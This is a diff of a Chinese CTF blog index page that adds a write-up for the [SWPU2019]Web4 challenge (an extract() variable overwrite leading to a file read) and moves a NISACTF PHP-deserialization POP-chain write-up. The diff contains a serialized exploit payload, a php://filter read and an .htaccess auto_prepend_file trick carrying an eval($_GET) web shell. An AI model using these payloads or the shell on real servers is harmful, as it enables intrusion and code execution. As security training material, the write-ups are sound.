@@ -112,6 +112,76 @@ var _hmt = _hmt || [];
 
   
     
+    <h3 class="article-title"><a href="/2025/02/17/SWPU2019-Web4/"><span>[SWPU2019]Web4</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/02/17/SWPU2019-Web4/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-02-17T06:11:22.000Z">
+          2025-02-17
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="SWPU2019-Web4-WP"><a href="#SWPU2019-Web4-WP" class="headerlink" title="[SWPU2019]Web4-WP"></a>[SWPU2019]Web4-WP</h2><p style="font-size:10px;color:#7f8c93">题目来源：BUUCTF<br>
+题目类型：WEB<br>
+设计考点：sql盲注,MSV,变量覆盖</p>
+
+<p><img src="/./../img/SWPU2019/1.png" alt="web1"><br><img src="/./../img/SWPU2019/2.png" alt="web2"><br>时间盲注爆破得到:glzjin_wants_a_girl_friend.zip<br>代码审计可以发现他的整体逻辑</p>
+<p>首先关注他的URL：<a target="_blank" rel="noopener" href="http://fab20018-12d4-4251-a25f-8c6635e869ea.node5.buuoj.cn:81/index.php?r=User/Index">http://fab20018-12d4-4251-a25f-8c6635e869ea.node5.buuoj.cn:81/index.php?r=User/Index</a><br>它读取了一个值$r$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 路由控制跳转至控制器</span><br><span class="line">if(!empty($_REQUEST[&#x27;r&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	$r = explode(&#x27;/&#x27;, $_REQUEST[&#x27;r&#x27;]);</span><br><span class="line">	list($controller,$action) = $r;</span><br><span class="line">	$controller = &quot;&#123;$controller&#125;Controller&quot;;</span><br><span class="line">	$action = &quot;action&#123;$action&#125;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if(class_exists($controller))</span><br><span class="line">	&#123;</span><br><span class="line">		if(method_exists($controller,$action))</span><br><span class="line">		&#123;</span><br><span class="line">			//</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$action = &quot;actionIndex&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$controller = &quot;LoginController&quot;;</span><br><span class="line">        $action = &quot;actionIndex&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">    $data = call_user_func(array( (new $controller), $action));</span><br></pre></td></tr></table></figure>
+<p>然后调用&#x2F;前对应的Controller并且执行对应的action方法</p>
+<p>接下来关注所有controller的父类,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">* 所有控制器的父类</span><br><span class="line">*/</span><br><span class="line">class BaseController</span><br><span class="line">&#123;</span><br><span class="line">	/*</span><br><span class="line">	 * 加载视图文件</span><br><span class="line">	 * viewName 视图名称</span><br><span class="line">	 * viewData 视图分配数据</span><br><span class="line">	*/</span><br><span class="line">	private $viewPath;</span><br><span class="line">	public function loadView($viewName =&#x27;&#x27;, $viewData = [])</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;</span><br><span class="line">		if(file_exists($this-&gt;viewPath))</span><br><span class="line">		&#123;</span><br><span class="line">			extract($viewData);</span><br><span class="line">			include $this-&gt;viewPath;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它的方法 $loadView$ 中有 $extract$ 函数我们可以变量覆盖，然后它执行了一个include，我们就去寻找对应的漏洞</p>
+<p>在User Controller中我们发现它调用loadView方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function actionIndex()</span><br><span class="line">    &#123;</span><br><span class="line">        $listData = $_REQUEST;</span><br><span class="line">        $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>他的actionIndex函数中的listdata值可控，我们继续跟进，按照代码逻辑，他会包含userIndex.php，我们继续跟进代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function imgToBase64($img_file) &#123;</span><br><span class="line"></span><br><span class="line">    $img_base64 = &#x27;&#x27;;</span><br><span class="line">    if (file_exists($img_file)) &#123;</span><br><span class="line">        $app_img_file = $img_file; // 图片路径</span><br><span class="line">        $img_info = getimagesize($app_img_file); // 取得图片的大小，类型等</span><br><span class="line"></span><br><span class="line">        $fp = fopen($app_img_file, &quot;r&quot;); // 图片是否可读权限</span><br><span class="line"></span><br><span class="line">        if ($fp) &#123;</span><br><span class="line">            $filesize = filesize($app_img_file);</span><br><span class="line">            $content = fread($fp, $filesize);</span><br><span class="line">            $file_content = chunk_split(base64_encode($content)); // base64编码</span><br><span class="line">            switch ($img_info[2]) &#123;           //判读图片类型</span><br><span class="line">                case 1: $img_type = &quot;gif&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 2: $img_type = &quot;jpg&quot;;</span><br><span class="line">                    break;</span><br><span class="line">                case 3: $img_type = &quot;png&quot;;</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $img_base64 = &#x27;data:image/&#x27; . $img_type . &#x27;;base64,&#x27; . $file_content;//合成图片的base64编码</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $img_base64; //返回图片的base64</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>发现它会获取一个img_file值然后尝试输出一个base64格式的图片文件，那么这题的攻击逻辑就很清楚了,<br>我们构造url的r值为user&#x2F;Index,让他调用userController中的actionIndex方法，然后传值给img_file&#x3D;&#x2F;..&#x2F;flag.php在baseController中的extract方法会创造img_file变量值为&#x2F;..&#x2F;flag.php，然后include userIndex.php文件，这就会让userIndex.php文件尝试读取flag.php文件然后把他的base64加密字符串输出，最后回显<br><img src="/./../img/SWPU2019/3.png" alt="web3"><br><img src="/./../img/SWPU2019/4.png" alt="web4"></p>
+
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2025/02/17/SWPU2019-Web4/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
     <h3 class="article-title"><a href="/2025/02/03/PHP内置类相关/"><span>PHP内置类相关</span></a></h3>
     
   
@@ -360,6 +430,7 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//上传.user.ini文件，条件如下：</span><br><span class="line"></span><br><span class="line">(1)服务器脚本语言为PHP                     </span><br><span class="line">(2)对应目录下面有可执行的php文件              //index.php</span><br><span class="line">(3)服务器使用CGI／FastCGI模式   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上传的文件内容</span><br><span class="line">GIF89a                         //auto_prepend_file是在文件前插入，而auto_append_file是在文件最后才插入。                  </span><br><span class="line">auto_prepend_file=b.gif       //需要注意上穿的文件名字要和设定的名字一样，这里可以设定多个</span><br></pre></td></tr></table></figure>
 <p>上传了 $.user.ini$ 文件之后，执行 $.user.ini$ 文件目录下的任意PHP文件，那么他就会执行我们在 $.user.ini$ 文件中制定的那个任意文件，且作为PHP文件执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">举个例子理解user.ini作用：</span><br><span class="line">/*这是.user.ini的两个配置  </span><br><span class="line">auto_prepend_file是在文件前插入</span><br><span class="line">auto_append_file是在文件最后才插入*/</span><br><span class="line"></span><br><span class="line">1.在user.ini 中设置</span><br><span class="line">auto_prepend_file=b.gif</span><br><span class="line"></span><br><span class="line">2.在b.gif中设置 一句话木马</span><br><span class="line"></span><br><span class="line">3.还有个php文件 如：前面做题中的index.php    </span><br><span class="line"></span><br><span class="line">如果这三个条件在同一个目录下面，就会出先问题，这里就相当于 在index.php中写</span><br><span class="line">了include &quot;b.gif&quot; , 可以进行文件包含，导致的后果是：当我们对目录中的index.</span><br><span class="line">php进行访问的时候，会调用.usre.ini 中的文件把b.gif文件以php的形式进行取造</span><br><span class="line">成.user.ini的漏洞</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line"># &lt;?php eval($_GET[1]);?&gt;</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -379,85 +450,6 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
   
     
     <h3 class="article-read"><a href="/2024/08/26/文件上传/"><span>more</span></a></h3>
-    
-  
-</article>
-
-
-
-
-
-  <article class="article-container ">
-
-  
-    
-    <h3 class="article-title"><a href="/2024/08/04/2022-popchains/"><span>2022:popchains</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2024/08/04/2022-popchains/" rel="bookmark">
-        <time class="entry-date published" datetime="2024-08-04T06:25:07.000Z">
-          2024-08-04
-        </time>
-      </a>
-    </span>
-    <br />
-    
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-          <h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><p style="font-size:10px;color:#7f8c93">题目来源：NSSCTF<br>
-题目类型：WEB<br>
-设计考点：POP链，PHP反序列化</p>
-
-<h3 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p style="font-size:16px">看到第一段判断出需要用GET传入一个<strong>wish</strong>的值，然后对其反序列化，接下来需要分析下面一串POP链</p>
-
-<hr>
-<ol>
-<li><p>首先寻找终点</p>
-<p>我们在<strong>Try_Work_Hard</strong>类终发现了<strong>include</strong>函数判断出这里可以使用php伪协议来读取最后的$flag$文件,接下来判断如触发这个<strong>append</strong>函数，我们发现  <strong>__invoke</strong> 魔术方法中存在append函数得知需要发动 <strong>__invoke</strong> 魔术方法来达到终点， <strong>__invoke</strong> 魔术方法是当一个类被当做函数运行的时候发动</p>
-<p style="font-size:12px">这里我们可以先对var这个append执行的值进行payload构建,<strong>$var=php://filter/convert.base64-encode/resource=/flag</strong></p></li>
-<li><p>接下来找到如何让__invoke魔术方法发挥作用的地方</p>
-<p>我们发现在<strong>Make_a_Change</strong>类中 <strong>__get</strong>魔术方法中有<code>return $function();</code><br>$function$的值可控，我们可以让$function$的值等于一个<strong>Try_Work_Hard</strong>类</p>
-</li>
-<li><p>接着寻找让__get魔术方法启动的地方，我们知道__get魔术方式是当我们访问一个类中私有或不存在的成员属性的时候自动触发，因此我们来到<strong>Road_is_Long</strong>，发现当中的__toString魔术方法访问了一个page变量，那我们可以让$this-&gt;string$等于<strong>Make_a_Change</strong>类，这样就能出发 <strong>__get</strong> 魔术方法，**__toSting<strong>魔术方法是当一个类被当做字符串使用时自动触发，我们就发现 <strong>__wakeup</strong>魔术方法中就有将字符串赋值给一个变量$page$而且$page$的值可控，那我们就让$page$等于一个</strong>Road_is_Long**类，我们暂且称第一个 <strong>Road_is_Long</strong> 类为$a$，第二个为$b$</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = new Make_a_Change();</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>a也就是我们要传入的wish，当a反序列化前会执行__wakeup魔术方法，这是会触发b的__toString在这时触发*<strong>Make_a_Change</strong>的__get魔术方法再到 <strong>Try_Work_Hard</strong>的__invoke魔术方法最后执行append提取到flag</p>
-</li>
-</ol>
-<h2 id="我们最终获得的POP链如下"><a href="#我们最终获得的POP链如下" class="headerlink" title="我们最终获得的POP链如下"></a>我们最终获得的POP链如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Road_is_Long::__wakeup() -&gt; Road_is_Long::__toString() -&gt; Make_a_Change::__get() -&gt; Try_Work_Hard::__invoke() -&gt; Try_Work_Hard::append()</span><br></pre></td></tr></table></figure>
-
-<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$f = new Try_Work_Hard();</span><br><span class="line">$m = new Make_a_Change();</span><br><span class="line">$m-&gt;effort = $f;</span><br><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = $m;</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>GET</strong>传入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A49%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fflag%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-  
-    
-    <h3 class="article-read"><a href="/2024/08/04/2022-popchains/"><span>more</span></a></h3>
     
   
 </article>
@@ -552,6 +544,85 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
   
     
     <h3 class="article-read"><a href="/2024/08/04/Hectf2024/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
+    <h3 class="article-title"><a href="/2024/08/04/2022-popchains/"><span>2022:popchains</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2024/08/04/2022-popchains/" rel="bookmark">
+        <time class="entry-date published" datetime="2024-08-04T06:25:07.000Z">
+          2024-08-04
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h2><p style="font-size:10px;color:#7f8c93">题目来源：NSSCTF<br>
+题目类型：WEB<br>
+设计考点：POP链，PHP反序列化</p>
+
+<h3 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1.代码审计"></a>1.代码审计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p style="font-size:16px">看到第一段判断出需要用GET传入一个<strong>wish</strong>的值，然后对其反序列化，接下来需要分析下面一串POP链</p>
+
+<hr>
+<ol>
+<li><p>首先寻找终点</p>
+<p>我们在<strong>Try_Work_Hard</strong>类终发现了<strong>include</strong>函数判断出这里可以使用php伪协议来读取最后的$flag$文件,接下来判断如触发这个<strong>append</strong>函数，我们发现  <strong>__invoke</strong> 魔术方法中存在append函数得知需要发动 <strong>__invoke</strong> 魔术方法来达到终点， <strong>__invoke</strong> 魔术方法是当一个类被当做函数运行的时候发动</p>
+<p style="font-size:12px">这里我们可以先对var这个append执行的值进行payload构建,<strong>$var=php://filter/convert.base64-encode/resource=/flag</strong></p></li>
+<li><p>接下来找到如何让__invoke魔术方法发挥作用的地方</p>
+<p>我们发现在<strong>Make_a_Change</strong>类中 <strong>__get</strong>魔术方法中有<code>return $function();</code><br>$function$的值可控，我们可以让$function$的值等于一个<strong>Try_Work_Hard</strong>类</p>
+</li>
+<li><p>接着寻找让__get魔术方法启动的地方，我们知道__get魔术方式是当我们访问一个类中私有或不存在的成员属性的时候自动触发，因此我们来到<strong>Road_is_Long</strong>，发现当中的__toString魔术方法访问了一个page变量，那我们可以让$this-&gt;string$等于<strong>Make_a_Change</strong>类，这样就能出发 <strong>__get</strong> 魔术方法，**__toSting<strong>魔术方法是当一个类被当做字符串使用时自动触发，我们就发现 <strong>__wakeup</strong>魔术方法中就有将字符串赋值给一个变量$page$而且$page$的值可控，那我们就让$page$等于一个</strong>Road_is_Long**类，我们暂且称第一个 <strong>Road_is_Long</strong> 类为$a$，第二个为$b$</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$b = new Road_is_Long();</span><br><span class="line">$b-&gt;string = new Make_a_Change();</span><br><span class="line">$a = new Road_is_Long();</span><br><span class="line">$a-&gt;page = $b;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>a也就是我们要传入的wish，当a反序列化前会执行__wakeup魔术方法，这是会触发b的__toString在这时触发*<strong>Make_a_Change</strong>的__get魔术方法再到 <strong>Try_Work_Hard</strong>的__invoke魔术方法最后执行append提取到flag</p>
+</li>
+</ol>
+<h2 id="我们最终获得的POP链如下"><a href="#我们最终获得的POP链如下" class="headerlink" title="我们最终获得的POP链如下"></a>我们最终获得的POP链如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Road_is_Long::__wakeup() -&gt; Road_is_Long::__toString() -&gt; Make_a_Change::__get() -&gt; Try_Work_Hard::__invoke() -&gt; Try_Work_Hard::append()</span><br></pre></td></tr></table></figure>
+
